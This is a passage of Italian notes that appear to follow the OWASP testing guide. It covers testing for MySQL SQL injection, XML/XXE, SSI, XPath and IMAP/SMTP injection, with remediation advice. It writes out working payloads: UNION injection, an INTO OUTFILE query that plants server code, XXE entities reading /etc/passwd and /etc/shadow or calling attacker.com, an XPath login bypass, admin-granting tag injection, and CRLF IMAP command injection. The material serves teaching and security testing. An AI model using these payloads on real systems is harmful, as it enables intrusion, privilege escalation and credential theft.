* Utilizzare query parametrizzate. Invece di costruire le query SQL concatenando le stringhe, usa le query parametrizzate o le procedure memorizzate. Questo assicura che i dati dell'input vengano trattati come dati e non come codice SQL.
* Utilizzare ORM (Object-Relational Mapping): Framework ORM come Hibernate, Entity Framework, e Sequelize gestiscono automaticamente le query SQL in modo sicuro, riducendo il rischio di iniezioni.
* Sanitizza sempre l'
* Limita l'accesso al database

#### 4 - Testing per MySQL
Le vulnerabilità da SQL Injection si verificano quando l'input viene utilizzato nella costruzione di una query SQL senza essere adeguatamente vincolato o sanificato. L'uso di SQL dinamico (costruzione di query SQL tramite concatenazione di stringhe) apre la porta a queste vulnerabilità. 

**Come testarlo**
Quando viene trovata una vulnerabilità da SQL injection in un'applicazione supportata da un database MySQL, possono essere effettuati diversi attacchi a seconda della versione di MySQL e dei privilegi dell'utente nel DBMS.

MySQL ha almeno quattro versioni utilizzate in produzione: 3.23.x, 4.0.x, 4.1.x e 5.0.x. Ogni versione offre un insieme di funzionalità proporzionali al numero di versione.

Va notato che per le versioni di MySQL precedenti alla 4.0.x, erano utilizzabili solo attacchi di Blind Injection booleani o basati sul tempo, poiché le funzionalità di sottoquery o delle dichiarazioni UNION non erano implementate.

Da ora in poi, assumeremo che ci sia una vulnerabilità classica di SQL injection, che può essere attivata da una richiesta simile a quella descritta nella sezione sui test per SQL Injection.

    http://www.example.com/page.php?id=2

**Il problema delle virgolette singole**
Prima di sfruttare le funzionalità di MySQL, è importante considerare come le stringhe possano essere rappresentate in una dichiarazione, poiché spesso le applicazioni web sfuggono le virgolette singole.
L'escape delle virgolette in MySQL è il seguente:

    'A string with \'quotes\''

In questo modo, MySQL interpreta gli apostrofi sfuggiti ' come caratteri e non come metacaratteri.

Se l'applicazione necessita di utilizzare stringhe costanti, si devono differenziare due casi:
* L'applicazine differenzia `'` e `\'`
* L'applicazione non differenzia `'` e `\'`

In MySQL, c'è un modo standard per bypassare la necessità delle virgolette singole, dichiarando una stringa costante senza la necessità di virgolette singole.

Supponiamo di voler conoscere il valore di un campo chiamato password in un record, con una condizione come la seguente:
1. password like `'A%'`
2. I valori ASCII in un hex concatenato: `password LIKE 0x4125`
3. La funzione char(): `password LIKE CHAR(65, 37)`

**Multiple Query Miste**
I connettori della libreria MySQL non supportano query multiple separate da un punto e virgola `(;)`, quindi non c'è modo di iniettare comandi SQL non omogenei all'interno di una singola vulnerabilità di SQL injection come in Microsoft SQL Server.
Ad esempio, la seguente iniezione darà un errore:

    1 ; update tablename set code='javascript code' where 1 --

**Raccolta di informazioni**
*Identificazione di MySQL*
Ovviamente, la prima cosa da sapere è se c'è un DBMS MySQL come database di backend. Il server MySQL ha una funzione che permette ad altri DBMS di ignorare una clausola nel dialetto MySQL. Quando un blocco di commento `'/**/'` contiene un punto esclamativo `'/*! sql here*/'`, viene interpretato da MySQL e considerato come un normale blocco di commento da altri DBMS, come spiegato nel manuale di MySQL.
Esempio:

    1 /*! and 1=0 */

Se MySQL è presente, la clausola all'interno del blocco di commento verrà interpretata.

*Versione*
Ci sono tre modi per ottenere questa informazione:
* Usando la variabile globale `@@version`
* usando la funzione VERSION()
* Usando il fingerprinting dei commenti con un numero di versione `/*!40110 and 1=0*/ `

che significa:

    if(version >= 4.1.10)
       add 'and 1=0' to the query.

In band injection:

    1 AND 1=0 UNION SELECT @@version /*

Inferential injection:

    1 AND @@version like '4.0%'

La risposta conterrà qualcosa tipo 

    5.0.22-log

*User di login*
Ci sono due tipi di utenti su cui il server MySQL si basa:
* USER(): l'utente connesso al server MySQL
* CURRENT_USER(): l'utente interno che esegue la query

C'è una certa differenza tra 1 e 2. La principale è che un utente anonimo potrebbe connettersi (se consentito) con qualsiasi nome, ma l'utente interno di MySQL ha un nome vuoto (''). Un'altra differenza è che una stored procedure o una funzione memorizzata vengono eseguite come utente creatore, se non dichiarato diversamente. Questo può essere conosciuto usando CURRENT_USER.

Injection in band:

    1 AND 1=0 UNION SELECT USER()

Inferential injection:

    1 AND USER() like 'root%'

La risposta conterrà qualcosa tipo:

    user@hostname

*Nome del database in uso*
C'è la funzione nativa `DATABASE()`

Injection in band:

    1 AND 1=0 UNION SELECT DATABASE()

Inferential injection:

    1 AND DATABASE() like 'db%'

La risposta conterrà qualcosa tipo:

    dbname

*Schema di informazione*
A partire da MySQL 5.0, è stata creata una vista chiamata INFORMATION_SCHEMA, che consente di ottenere tutte le informazioni su database, tabelle e colonne, nonché su procedure e funzioni.
Tutte queste informazioni possono essere estratte utilizzando tecniche note, come descritto nella sezione di SQL Injection.

| Tables in INFORMATION_SCHEMA | Description                                             |
|------------------------------|---------------------------------------------------------|
| SCHEMATA                     | All databases the user has (at least) SELECT_priv      |
| SCHEMA_PRIVILEGES            | The privileges the user has for each DB                 |
| TABLES                       | All tables the user has (at least) SELECT_priv         |
| TABLE_PRIVILEGES             | The privileges the user has for each table              |
| COLUMNS                      | All columns the user has (at least) SELECT_priv        |
| COLUMN_PRIVILEGES            | The privileges the user has for each column             |
| VIEWS                        | All views the user has (at least) SELECT_priv          |
| ROUTINES                     | Procedures and functions (needs EXECUTE_priv)           |
| TRIGGERS                     | Triggers (needs INSERT_priv)                            |
| USER_PRIVILEGES              | Privileges connected User has                           |

*Linguaggio che sfugge le virgolette singole: si possono usare le virgolete singole come parte del discorso scrivendo `\'`*

    SELECT 'L\' esempio è qui';

*Linguaggio che non sfugge le virgolette singole: ogni volta che si deve usare un `'` va trovato un escamotage o cambiare la propria logica*

**Vettori di attacco**
*Scrivere un file* 
Se l'utente connesso ha privilegi FILE (può leggere e scrivere sui file) e le virgolette singole non sono sfuggite, la clausola into outfile può essere utilizzata per esportare i risultati di una query in un file.

    SELECT * FROM table INTO OUTFILE '/tmp/file';

    SELECT 1 LIMIT 1 INTO OUTFILE '/var/www/root/test.jsp' FIELDS ENCLOSED BY '//' LINES TERMINATED BY '\n<%jsp code here%>';

Questa query prende il primo valore della prima colonna del risultato e lo scrive in `var/www/root/test.jsp` racchiuso tra `//` tipo `//1//`. Dopo aver fatto ciò, questo va a capo e scrive `<%jsp code here%>` scrivendo nei file di test il codice malevolo.

    //1//
    <%jsp code here%>

Questo attacco funziona solamente se il linguaggio non sfugge i `'`, altrimenti un `sanitaize()` farebbe diventare tutti i `'` degli `\'`.

*Leggere un file*
`load_file` è una funzione nativa che può leggere un file quando consentito dai permessi del file system. Se un utente connesso ha privilegi FILE, può essere utilizzata per ottenere il contenuto dei file. La sanificazione delle virgolette singole può essere bypassata utilizzando le tecniche descritte in precedenza.

    LOAD_FILE('nomefile');

**Attacco SQL injection standard**
In un attacco SQL injection standard, è possibile visualizzare i risultati direttamente in una pagina come output normale o come errore di MySQL. Utilizzando attacchi SQL injection già menzionati e le caratteristiche di MySQL già descritte, l'injection SQL diretta può essere facilmente realizzata a un livello di profondità che dipende principalmente dalla versione di MySQL con cui il pentester si confronta.

**Out of band SQL injection**
Può essere compiuta sfruttando la clausola `into outfile` (solo se ho i privilegi di `file`).

**Blind SQL injection**
Per questo tipo di iniezione ci sono delle funzioni native di SQL che possono aiutare:
* `LENGTH(str)` che mostra la lunghezza di una stringa
* `SUBSTRING(string, offser, #chars_returned)` estrae una sottostringa data una stringa
* `BENCHMARK(#ofcycles, action_to_be_performed)` e `SLEEP()` possono essere usate quando l'iniezinoe di valori booleani non dà risultati.

*Per gli altri programmi di database, controllare gli le sottocartellee della 4.7.5 (4.7.5.1,4.7.5.3, ecc...) sul [sito di OWASP](https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing).*

#### 5 - Test per le iniezioni XML
Il test di iniezione XML consiste nel tentativo di inserire un documento XML nell'applicazione. Se il parser XML non riesce a convalidare contestualmente i dati, il test avrà un esito positivo.

**Come testarlo**
Supponiamo che ci sia un'applicazione web che utilizza una comunicazione in stile XML per eseguire la registrazione degli utenti. Questo avviene creando e aggiungendo un nuovo nodo utente in un file xmlDb.
Supponiamo che il file xmlDB sia strutturato come segue:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail>
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail>
        </user>
    </users>

Quando un utente si registra compilando un modulo HTML, l'applicazione riceve i dati dell'utente in una richiesta standard, che, per semplificare, supporremo venga inviata come richiesta GET.
Per esempio:
* Nome utente: tony
* Password: Un6R34kb!e
* Email: s4tan@hell.com

producono la richiesta:

    http://www.example.com/addUser.php?username=tony&password=Un6R34kb!e&email=s4tan@hell.com
    
L'applicazione costruisce quindi il seguente nodo:

    <user>
        <username>tony</username>
        <password>Un6R34kb!e</password>
        <userid>500</userid>
        <mail>s4tan@hell.com</mail>
    </user>

che verrà aggiunto al xmlDB:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail>
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail>
        </user>
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password>
            <userid>500</userid>
            <mail>s4tan@hell.com</mail>
        </user>
    </users>

**Scoperta**
Il primo passo per testare un'applicazione alla ricerca di una vulnerabilità di XML Injection consiste nel tentare di inserire caratteri metacaratteri XML.

* **Apice singolo `'`**: Se non sanificato, questo carattere potrebbe generare un'eccezione durante il parsing XML, se il valore iniettato deve far parte di un valore di attributo in un tag.

        <node attrib='foo''/>


* **Apice doppio `"`: questo carattere ha lo stesso significato dell'apice singolo e potrebbe essere utilizzato se il valore dell'attributo è racchiuso tra virgolette doppie.

        <node attrib="foo""/>

* **Parentesi angolari `<>`:  Aggiungendo una parentesi angolare aperta o chiusa in un input utente come il seguente:

        Username = foo<

* **Tag commento `<!--/-->`**: 

        Username = foo<!--

* **Ampersand `&`**: L'ampersand è utilizzato nella sintassi XML per rappresentare le entità. Se `&` non è codificato con `&amp`, può essere utilizzato per testare l'iniezione XML.

        Username = &foo

* **Delimitatori di sezione CDATA `<!CDATA[/]]>`**: i caratteri dentro questa sezione non vengono analizzati dal parser XML. I programmatori la potrebbero mettere per invalidare ogni input malevolo dall'esterno.
    Ad esempio, se è necessario rappresentare la stringa <foo> all'interno di un nodo di testo, si può usare una sezione CDATA:

        <node>
            <![CDATA[<foo>]]>
        </node>

    in modo che <foo> non sia analizzato come markup.
    il tester potrebbe provare a iniettare la stringa finale di CDATA ]]>, per cercare di invalidare il documento XML.

        userName = ]]

    questo diventerà:

        <username><![CDATA[]]>]]></username>

    Un altro test riguarda il tag CDATA. Supponiamo che il documento XML venga elaborato per generare una pagina HTML. In questo caso, i delimitatori della sezione CDATA possono essere semplicemente eliminati, senza ulteriori controlli sui loro contenuti. È quindi possibile iniettare tag HTML, che saranno inclusi nella pagina generata, bypassando completamente le routine di sanificazione esistenti.
    Consideriamo un esempio concreto. Supponiamo di avere un nodo contenente del testo che verrà visualizzato all'utente:

        <html>
            $HTMLCode
        </html>

    Allora, un attaccante può fornire il seguente input:

        $HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>

    e ottenere il seguente nodo:

        <html>
            <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
        </html>

    Durante l'elaborazione, i delimitatori della sezione CDATA vengono eliminati, generando il seguente codice HTML:

        <script>
            alert('XSS')
        </script>

*Questi sopra sono tutti modi per rendere un documento XML non valido*

**Entità esterne**: L'insieme di entità valide può essere esteso definendo nuove entità. Se la definizione di un'entità è un URI, l'entità è chiamata entità esterna. A meno che non sia configurato diversamente, le entità esterne costringono il parser XML ad accedere alla risorsa specificata dall'URI, ad esempio, un file sul computer locale o su sistemi remoti. 
Per testare le vulnerabilità XXE, si può usare il seguente input:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///dev/random" >]>
    <foo>&xxe;</foo>
                                
Questo test potrebbe far crashare il server web (su un sistema UNIX), se il parser XML tenta di sostituire l'entità con il contenuto del file /dev/random.
Altri test utili sono i seguenti:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/shadow" >]><foo>&xxe;</foo>

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [ <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://www.attacker.com/text.txt" >]><foo>&xxe;</foo>

**Iniezione di tag**
Una volta completato il primo passaggio, il tester avrà alcune informazioni sulla struttura del documento XML. È quindi possibile provare a iniettare dati e tag XML. Mostreremo un esempio di come ciò possa portare a un attacco di escalation dei privilegi.

Consideriamo l'applicazione precedente. Inserendo i seguenti valori:
* Nome utente: tony
* Password: Un6E34kb!e
* Email: `s4tan@hell.com</mail><userid>0</userid><mail>s4tan@hell.com`

l'applicazione costruirà un nuovo nodo e lo aggiungerà al database XML:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail>
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail>
        </user>
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password>
            <userid>500</userid>
            <mail>s4tan@hell.com</mail>
            <userid>0</userid>
            <mail>s4tan@hell.com</mail>
        </user>
    </users>

Il file XML risultante è ben formato. Inoltre, è probabile che, per l'utente tony, il valore associato al tag userid sia quello apparso per ultimo, cioè 0 (l'ID dell'amministratore). In altre parole, abbiamo iniettato un utente con privilegi amministrativi.

L'unico problema è che il tag userid appare due volte nell'ultimo nodo utente. Spesso, i documenti XML sono associati a uno schema o a un DTD e verranno rifiutati se non rispettano tali specifiche.

Supponiamo che il documento XML sia specificato dal seguente DTD:

    <!DOCTYPE users [
        <!ELEMENT users (user+) >
        <!ELEMENT user (username,password,userid,mail+) >
        <!ELEMENT username (#PCDATA) >
        <!ELEMENT password (#PCDATA) >
        <!ELEMENT userid (#PCDATA) >
        <!ELEMENT mail (#PCDATA) >
    ]>

Si noti che il nodo userid è definito con cardinalità 1. In questo caso, l'attacco mostrato prima (e altri attacchi semplici) non funzioneranno, se il documento XML viene convalidato rispetto al suo DTD prima di qualsiasi elaborazione.

Tuttavia, questo problema può essere risolto se il tester controlla il valore di alcuni nodi precedenti al nodo problematico (userid, in questo esempio). Infatti, il tester può commentare tale nodo, iniettando una sequenza di inizio/fine commento:

    Username: tony
    Password: Un6R34kb!e</password><!--
    E-mail: --><userid>0</userid><mail>s4tan@hell.com

In questo caso, il database XML finale è:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <userid>0</userid>
            <mail>gandalf@middleearth.com</mail>
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <userid>500</userid>
            <mail>Stefan0@whysec.hmm</mail>
        </user>
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password><!--</password>
            <userid>500</userid>
            <mail>--><userid>0</userid><mail>s4tan@hell.com</mail>
        </user>
    </users>

I seguenti API java se non configurati in modo corretto potrebbero essere vulnerabili ad iniezione di entità esterne nell'XML.

    javax.xml.parsers.DocumentBuilder
    javax.xml.parsers.DocumentBuildFactory
    org.xml.sax.EntityResolver
    org.dom4j.*
    javax.xml.parsers.SAXParser
    javax.xml.parsers.SAXParserFactory
    TransformerFactory
    SAXReader
    DocumentHelper
    SAXBuilder
    SAXParserFactory
    XMLReaderFactory
    XMLInputFactory
    SchemaFactory
    DocumentBuilderFactoryImpl
    SAXTransformerFactory
    DocumentBuilderFactoryImpl
    XMLReader
    Xerces: DOMParser, DOMParserImpl, SAXParser, XMLParser

Controlla il codice sorgente se il docType, DTD esterna e le entità di parametro esterne sono impostate come utilizzi vietati.

* [XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

**Rimedi**
* Configura il parser XML in modo da disabilitare le entità esterne
* Scegliere parser XML che offrono opzioni di sicurezza integrate (come `javax.xml.parsers.DocumentBuilderFactory` in Java)
* Validare i dati in ingresso per assicurarsi che siano conformi a uno schema definito (ad esempio, XSD). Questo può aiutare a identificare e rimuovere contenuti pericolosi.
* Se possibile, limitare l'accesso alle risorse di sistema e alle risorse di rete che il parser XML può utilizzare.

#### 6 - Test per l'iniezione di SSI (Server Side Includes)
I server web offrono generalmente agli sviluppatori la possibilità di inserire piccoli pezzi di codice dinamico all'interno di pagine HTML statiche, senza dover utilizzare linguaggi di programmazione complessi lato server o lato client. Questa funzionalità è fornita dagli Includes Lato Server (SSI).

Gli Includes Lato Server sono direttive che il server web interpreta prima di servire la pagina all'utente. Rappresentano un'alternativa alla scrittura di programmi CGI o all'inserimento di codice utilizzando linguaggi di scripting lato server, quando è necessario eseguire compiti molto semplici. Le implementazioni comuni di SSI forniscono direttive per includere file esterni, impostare e stampare variabili d'ambiente CGI del server web o eseguire script CGI esterni o comandi di sistema.

L'SSI può portare a un'esecuzione remota di comandi (RCE), tuttavia la maggior parte dei server web ha disabilitato per impostazione predefinita la direttiva exec.

Questa vulnerabilità è molto simile a una vulnerabilità classica di iniezione di linguaggi di scripting. Una mitigazione è che il server web deve essere configurato per consentire SSI. D'altro canto, le vulnerabilità di iniezione SSI sono spesso più semplici da sfruttare, poiché le direttive SSI sono facili da comprendere e, allo stesso tempo, piuttosto potenti, ad esempio, possono restituire il contenuto di file ed eseguire comandi di sistema.

**Come testarlo**
Per testare la presenza di SSI sfruttabili, inietta direttive SSI come input dell'utente. Se gli SSI sono abilitati e la validazione dell'input dell'utente non è stata implementata correttamente, il server eseguirà la direttiva. Questo è molto simile a una vulnerabilità classica di iniezione di linguaggi di scripting in cui si verifica quando l'input dell'utente non è correttamente validato e sanificato.

Un altro modo per verificare che le direttive SSI siano abilitate è controllare pagine con estensione .shtml, associata alle direttive SSI. L'uso dell'estensione .shtml non è obbligatorio, quindi non trovare file .shtml non significa necessariamente che il target non sia vulnerabile ad attacchi di iniezione SSI.

Il passo successivo è determinare tutti i possibili vettori di input dell'utente e testare se l'iniezione SSI è sfruttabile.

**Rimedi**
* Abilitare SSI solamente se necessario (disabilitarlo è l'opzione migliore per evitare attacchi SSI)
* Implementare una robusta validazione e sanitizzazione dell'input utente. Questo include il controllo dei caratteri consentiti e la rimozione o l'escape di caratteri speciali che potrebbero essere utilizzati per iniettare direttive SSI.

#### 7 - Test per Xpath injection
XPath è un linguaggio progettato e sviluppato principalmente per affrontare parti di un documento XML. Nei test di iniezione XPath, verifichiamo se è possibile iniettare sintassi XPath in una richiesta interpretata dall'applicazione, consentendo a un attaccante di eseguire query XPath controllate dall'utente. Se sfruttata con successo, questa vulnerabilità può permettere a un attaccante di aggirare i meccanismi di autenticazione o accedere a informazioni senza una corretta autorizzazione.

Poiché, da un punto di vista concettuale, XPath è molto simile a SQL nel suo scopo e nelle sue applicazioni, un risultato interessante è che gli attacchi di iniezione XPath seguono la stessa logica degli attacchi di SQL Injection.

**Come testarlo**
Per avere una prima comprensione del problema, immaginiamo una pagina di accesso che gestisce l'autenticazione a un'applicazione in cui l'utente deve inserire il proprio nome utente e password. Supponiamo che il nostro database sia rappresentato dal seguente file XML:

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <users>
        <user>
            <username>gandalf</username>
            <password>!c3</password>
            <account>admin</account>
        </user>
        <user>
            <username>Stefan0</username>
            <password>w1s3c</password>
            <account>guest</account>
        </user>
        <user>
            <username>tony</username>
            <password>Un6R34kb!e</password>
            <account>guest</account>
        </user>
    </users>

Una query XPath che restituisce l'account il cui nome utente è gandalf e la password è !c3 sarebbe la seguente:

    string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())

Se l'applicazione non filtra correttamente l'input dell'utente, il tester potrà iniettare codice XPath e interferire con il risultato della query. Ad esempio, il tester potrebbe inserire i seguenti valori:

    Username: ' or '1' = '1
    Password: ' or '1' = '1

Utilizzando questi parametri, la query diventa:

    string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())

Come in un comune attacco di SQL Injection, abbiamo creato una query che si valuta sempre come vera, il che significa che l'applicazione autenticherà l'utente anche se non è stato fornito un nome utente o una password.

E, come in un comune attacco di SQL Injection, con l'iniezione XPath, il primo passo è inserire un apostrofo (`'`) nel campo da testare, introducendo un errore di sintassi nella query, e verificare se l'applicazione restituisce un messaggio di errore.

Se non c'è conoscenza sui dettagli interni dei dati XML e se l'applicazione non fornisce messaggi di errore utili che ci aiutino a ricostruire la sua logica interna, è possibile eseguire un attacco di Blind XPath Injection, il cui obiettivo è ricostruire l'intera struttura dei dati. La tecnica è simile all'iniezione SQL basata su inferenza, poiché l'approccio consiste nell'iniettare codice che crea una query che restituisce un'informazione. La [Blind XPath Injection](https://owasp.org/www-community/attacks/Blind_XPath_Injection) è spiegata più dettagliatamente da Amit Klein nel documento di riferimento.

**Rimedi**
* È fondamentale filtrare e sanificare tutti gli input dell'utente. Utilizzare librerie di sanitizzazione per rimuovere caratteri speciali che potrebbero essere usati per iniezioni.
* Proprio come con SQL, l'uso di dichiarazioni preparate (o parametrizzate) aiuta a separare i dati dall'istruzione. In XPath, questo può essere implementato attraverso l'uso di variabili o binding di parametri.

#### 8 - Test per le iniezioni IMAP/SMTP
*Traduzione in italiano completa perché non so di cosa parli - Filippo*

Questa minaccia interessa tutte le applicazioni che comunicano con i server di posta (IMAP/SMTP), in genere le applicazioni di webmail. L'obiettivo di questo test è verificare la capacità di iniettare comandi IMAP/SMTP arbitrari nei server di posta, a causa di dati di input non correttamente sanitizzati.

La tecnica di Injection IMAP/SMTP è più efficace se il server di posta non è direttamente accessibile da Internet. Quando è possibile una comunicazione completa con il server di posta di backend, si consiglia di effettuare test diretti.

Un'Injection IMAP/SMTP consente di accedere a un server di posta che altrimenti non sarebbe direttamente accessibile da Internet. In alcuni casi, questi sistemi interni non hanno lo stesso livello di sicurezza infrastrutturale e di hardening applicato ai server web di front-end. Pertanto, i risultati del server di posta potrebbero essere più vulnerabili ad attacchi da parte degli utenti finali.

![Communication with the mail servers](./img/Imap-smtp-injection.png)

I passi 1 e 2 mostrano l'interazione dell'utente con il client di webmail, mentre il passo 2' evidenzia il tester che bypassa il client di webmail e interagisce direttamente con i server di posta di backend.

**Come testarlo**
*Identificare i parametri vulnerabili*
Per rilevare parametri vulnerabili, il tester deve analizzare la capacità dell'applicazione di gestire gli input. Il testing della validazione degli input richiede al tester di inviare richieste fasulle o malevole al server e di analizzare la risposta. In un'applicazione sicura, la risposta dovrebbe essere un errore con un'azione corrispondente che informa il client che qualcosa è andato storto. In un'applicazione vulnerabile, la richiesta malevola potrebbe essere elaborata dall'applicazione back-end, che risponderà con un messaggio di risposta HTTP 200 OK.

È importante notare che le richieste inviate devono corrispondere alla tecnologia testata. Inviare stringhe di SQL injection per Microsoft SQL server quando si utilizza un server MySQL porterà a risposte positive errate. In questo caso, inviare comandi IMAP malevoli è il modus operandi, poiché IMAP è il protocollo sottostante in fase di test. 

I parametri speciali di IMAP che dovrebbero essere utilizzati sono:

| On the IMAP server                                     | On the SMTP server     |
|-------------------------------------------------------|------------------------|
| Authentication                                         | Emissor email          |
| Operations with mail boxes (list, read, create, delete, rename) | Destination email      |
| Operations with messages (read, copy, move, delete)   | Subject                |
| Disconnection                                          | Message body           |
|                                                       | Attached files         |

In questo esempio, il parametro "mailbox" viene testato manipolando tutte le richieste con il parametro in:

    http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46106&startMessage=1

Possono essere utilizzati i seguenti esempi.

1. Assegnare un valore nullo al parametro:

        http://<webmail>/src/read_body.php?mailbox=&passed_id=46106&startMessage=1

2. Sostituire il valore con un valore casuale:

        http://<webmail>/src/read_body.php?mailbox=NOTEXIST&passed_id=46106&startMessage=1

3. Aggiungere altri valori al parametro:

        http://<webmail>/src/read_body.php?mailbox=INBOX PARAMETER2&passed_id=46106&startMessage=1

4. Aggiungere caratteri speciali non standard (ad es.`: , ', ", @, #, !, |`):

        http://<webmail>/src/read_body.php?mailbox=INBOX"&passed_id=46106&startMessage=1

5. Eliminare il parametro:

        http://<webmail>/src/read_body.php?passed_id=46106&startMessage=1

Il risultato finale del testing sopra fornisce al tester tre possibili situazioni:
* S1 - L'applicazione restituisce un codice/messaggio di errore
* S2 - L'applicazione non restituisce un codice/messaggio di errore, ma non esegue l'operazione richiesta
* S3 - L'applicazione non restituisce un codice/messaggio di errore e realizza normalmente l'operazione richiesta

Le situazioni S1 e S2 rappresentano un'iniezione IMAP/SMTP riuscita.

L'obiettivo di un attaccante è ricevere la risposta S1, poiché è un indicatore che l'applicazione è vulnerabile all'iniezione e a ulteriori manipolazioni.

Supponiamo che un utente recuperi le intestazioni delle email utilizzando la seguente richiesta HTTP:

    http://<webmail>/src/view_header.php?mailbox=INBOX&passed_id=46105&passed_ent_id=0

Un attaccante potrebbe modificare il valore del parametro INBOX iniettando il carattere `"` (%22 utilizzando la codifica URL):

    http://<webmail>/src/view_header.php?mailbox=INBOX%22&passed_id=46105&passed_ent_id=0

In questo caso, la risposta dell'applicazione potrebbe essere:

    ERROR: Bad or malformed request.
    Query: SELECT "INBOX""
    Server responded: Unexpected extra arguments to Select

La situazione S2 è più difficile da testare con successo. Il tester deve utilizzare l'iniezione di comandi alla cieca per determinare se il server è vulnerabile.

D'altra parte, l'ultima situazione (S3) non è rilevante in questo contesto.

**Comprendere il flusso di dati e la struttura di distribuzione del cliente**
Dopo aver identificato tutti i parametri vulnerabili (ad esempio, passed_id), il tester deve determinare quale livello di iniezione sia possibile e poi progettare un piano di test per sfruttare ulteriormente l'applicazione.

In questo caso di test, abbiamo rilevato che il parametro passed_id dell'applicazione è vulnerabile e viene utilizzato nella seguente richiesta:

    http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=46225&startMessage=1

Utilizzando il seguente caso di test (fornendo un valore alfabetico quando è richiesto un valore numerico):

    http://<webmail>/src/read_body.php?mailbox=INBOX&passed_id=test&startMessage=1

si genererà il seguente messaggio di errore:

    ERROR : Bad or malformed request.
    Query: FETCH test:test BODY[HEADER]
    Server responded: Error in IMAP command received by server.

In questo esempio, il messaggio di errore restituisce il nome del comando eseguito e i relativi parametri.

In altre situazioni, il messaggio di errore (non controllato dall'applicazione) contiene il nome del comando eseguito, ma leggere il corrispondente RFC consente al tester di capire quali altri comandi possono essere eseguiti.

Se l'applicazione non restituisce messaggi di errore descrittivi, il tester deve analizzare la funzionalità interessata per dedurre tutti i comandi (e i parametri) possibili associati alla funzionalità menzionata. Ad esempio, se è stato rilevato un parametro vulnerabile nella funzionalità di creazione della casella di posta, è logico supporre che il comando IMAP interessato sia CREATE. Secondo l'RFC, il comando CREATE accetta un parametro che specifica il nome della casella di posta da creare.

**Iniezione di comandi IMAP/SMTP**
Una volta che il tester ha identificato i parametri vulnerabili e ha analizzato il contesto in cui vengono eseguiti, la fase successiva consiste nello sfruttare la funzionalità.

Questa fase ha due possibili esiti:
* **L'iniezione è possibile in uno stato non autenticato**: la funzionalità interessata non richiede che l'utente sia autenticato. I comandi (IMAP) iniettati disponibili sono limitati a: `CAPABILITY, NOOP, AUTHENTICATE, LOGIN e LOGOUT`.
* **L'iniezione è possibile solo in uno stato autenticato**: lo sfruttamento riuscito richiede che l'utente sia completamente autenticato prima che il test possa continuare.

In ogni caso, la struttura tipica di un'iniezione IMAP/SMTP è la seguente:

* Intestazione: fine del comando atteso;
* Corpo: iniezione del nuovo comando;
* Footer: inizio del comando atteso.

È importante ricordare che, per eseguire un comando IMAP/SMTP, il comando precedente deve essere terminato con la sequenza CRLF (%0d%0a).

Supponiamo che, nella fase di identificazione dei parametri vulnerabili, l'attaccante rilevi che il parametro message_id nella seguente richiesta è vulnerabile:

    http://<webmail>/read_email.php?message_id=4791

Supponiamo anche che l'analisi effettuata nella fase 2 ("Comprendere il flusso dei dati e la struttura di distribuzione del client") abbia identificato il comando e gli argomenti associati a questo parametro come:

    FETCH 4791 BODY[HEADER]

In questo scenario, la struttura dell'iniezione IMAP sarebbe:

    http://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791

Questo genererebbe i seguenti comandi:

    ???? FETCH 4791 BODY[HEADER]
    V100 CAPABILITY
    V101 FETCH 4791 BODY[HEADER]

dove

    Header = 4791 BODY[HEADER]
    Body   = %0d%0aV100 CAPABILITY%0d%0a
    Footer = V101 FETCH 4791

**Rimedi**
* È fondamentale filtrare e sanificare tutti gli input dell'utente. Utilizzare librerie di sanitizzazione per rimuovere caratteri speciali che potrebbero essere usati per iniezioni.
* Proprio come con SQL, l'uso di dichiarazioni preparate (o parametrizzate) aiuta a separare i dati dall'istruzione. In XPath, questo può essere implementato attraverso l'uso di variabili o binding di parametri.

#### 9 - Test per l'iniezione di codice
